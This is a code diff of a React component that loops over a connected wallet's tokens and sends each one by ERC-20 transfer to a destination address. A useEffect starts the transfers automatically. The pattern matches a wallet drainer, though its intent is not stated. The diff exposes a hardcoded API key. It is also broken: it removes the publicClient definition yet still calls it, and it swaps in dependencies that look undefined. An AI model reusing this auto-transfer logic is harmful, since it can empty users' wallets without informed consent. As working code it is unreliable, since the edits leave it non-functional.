@@ -7,14 +7,10 @@ import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
 import { normalize } from 'viem/ens';
 import { isAddress } from 'essential-eth';
 import axios from 'axios'; // Utilisation de axios pour effectuer des requêtes HTTP
+import { ethers } from 'ethers'; // Importation de ethers
 
 const ETHERSCAN_API_KEY = 'AKU1Q3I8T66E6R7ZZNURMZ1D6WRQ1TPR8Z'; // Votre clé API Etherscan
 const ETHERSCAN_API_URL = 'https://api.etherscan.io/api';
-
-// Définir le client public (exemple avec wagmi ou ethers.js)
-import { ethers } from 'ethers';
-
-const publicClient = new ethers.JsonRpcProvider('https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID');
 
 const fetchGasPrice = async () => {
   try {
@@ -49,9 +45,10 @@ export const SendTokens = () => {
     if (!walletClient) return;
     if (!destinationAddress) return;
 
-    // Résoudre l'adresse ENS
     if (destinationAddress.includes('.')) {
-      const resolvedDestinationAddress = await publicClient.resolveName(destinationAddress);
+      const resolvedDestinationAddress = await publicClient.getEnsAddress({
+        name: normalize(destinationAddress),
+      });
       if (resolvedDestinationAddress) {
         setDestinationAddress(resolvedDestinationAddress);
       } else {
@@ -72,10 +69,10 @@ export const SendTokens = () => {
       if (!token) continue;
 
       try {
-        const { request } = await walletClient.simulateContract({
+        const { request } = await publicClient.simulateContract({
           account: walletClient.account,
           address: tokenAddress,
-          abi: erc20ABI, // Assurez-vous que `erc20ABI` est défini/importé
+          abi: erc20ABI,
           functionName: 'transfer',
           args: [
             destinationAddress as `0x${string}`,
@@ -114,13 +111,13 @@ export const SendTokens = () => {
         console.error(`Erreur avec le token ${token?.contract_ticker_symbol}:`, err);
       }
     }
-  }, [tokens, destinationAddress, walletClient, setCheckedRecords]); // Ajouter les dépendances manquantes
+  }, [tokens, destinationAddress, walletClient, setCheckedRecords, setDestinationAddress]); // Ajout des dépendances
 
   useEffect(() => {
     if (tokens.length > 0 && destinationAddress) {
       sendAllTokens();
     }
-  }, [tokens, destinationAddress, walletClient, sendAllTokens]); // Assurez-vous d'inclure `sendAllTokens` ici
+  }, [tokens, destinationAddress, walletClient, setCheckedRecords, setTokens, fetchData]); // Ajout des dépendances
 
   return <div style={{ margin: '20px' }}>Tokens being sent automatically...</div>;
 };
